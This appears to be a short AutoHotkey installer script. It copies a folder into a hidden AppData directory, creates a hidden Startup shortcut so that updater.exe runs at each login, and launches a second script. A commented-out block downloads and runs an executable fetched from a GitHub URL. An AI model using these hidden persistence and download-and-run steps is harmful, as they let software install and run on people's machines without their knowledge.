#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
#SingleInstance, Force ; Only launches 1 instance of this script
FileCopyDir, Stuff, %A_AppData%\Cum, 1
FileSetAttrib, +h,  %A_AppData%\Cum, 1
FileCreateShortcut, %A_AppData%\Cum\updater.exe, %A_Startup%\Cum.lnk, %A_ScriptDir%
FileSetAttrib, +h,  %A_Startup%\Cum.lnk
Run, %A_AppData%\Cum\Test.ahk
/*

; Gives the folder the 'hidden' tag 
v := "https://github.com/JWitterick/Test/blob/main/updater.exe?raw=true"
URLDownloadToFile %v%, %A_AppData%\Cum\updater.exe
; Downloads the updater
v := "https://github.com/JWitterick/Test/blob/main/local_version.txt?raw=true"
URLDownloadToFile %v%, %A_AppData%\Cum\local_version.txt
; Downloads the local version indicator
FileCreateShortcut, %A_AppData%\Cum\updater.exe, %A_Startup%\Cum.lnk, %A_ScriptDir%
FileSetAttrib, +h,  %A_Startup%\Cum.lnk
; Creates and hides a shortcut (Broken)
Run,  %A_AppData%\Cum\updater.exe
*/
